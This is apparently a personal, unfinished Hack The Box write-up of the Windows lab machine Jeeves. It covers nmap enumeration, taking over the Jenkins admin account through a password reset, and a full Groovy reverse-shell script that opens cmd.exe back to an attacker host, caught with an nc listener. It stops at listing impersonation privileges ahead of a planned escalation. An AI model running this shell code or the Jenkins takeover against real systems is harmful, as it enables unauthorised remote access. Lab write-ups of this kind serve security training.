---
date: 2024-10-03
title: Jeeves HTB Write-Up
machine_ip: 10.10.10.63
os: Windows
difficulty: Medium
my_rating: 3
tags:
  - Windows
  - PrivEsc
  - TokenImpersonation
  - whoami
references: "[[📦HTB Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -A -p- -sVC 10.10.10.63 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 17:45 PDT
Nmap scan report for 10.10.10.63
Host is up (0.11s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-10-04T05:48:39
|_  start_date: 2024-10-04T05:45:13
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   102.90 ms 10.10.14.1
2   103.37 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.01 seconds
```
- Taking a look at Jetty 9.4.z-SNAPSHOT and exploits relating, we find that there is a Information Disclosure vulnerability if the `GET /%2e%2e/WEB-INF/web.xml HTTP/1.` is specified in a get request, the encoded URI can access WEB-INF.
	- Rabbit hole... enumerating more

- Used `gobuster` to enumerate any directories in both `80` and `50000` ports. Port `80` had no additional, but port `50000` had:
```

```


# Foothold
- gain shell via exploit
- `http://10.10.10.63:50000/askjeeves/` shows a web portal
- In `People` tab we see `admin`. We can change their password. Changed admin creds to `admin:admin`
	- We are now Admin in Jenkins 2.87
- Found a `Script Console` we can potential exploit and get a reverse shell. After [researching](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6), found [`revshell.groovy`](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) which can give us a reverse shell into Jenkins:
```
String host="10.10.14.6";

int port=4444;

String cmd="cmd.exe";

Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream 
pi=p.getInputStream()
pe=p.getErrorStream()
si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();
Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Caught a shell
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```

- Working on getting `JuicyPotato` to transfer over so I can escalate privileges...
- ==Resume==
# PrivEsc
- escalate from user to root
- We have `SeImpersonatePrivilege` enabled on the user `jeeves\kohsuke`... Let's see if we can impersonate
```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

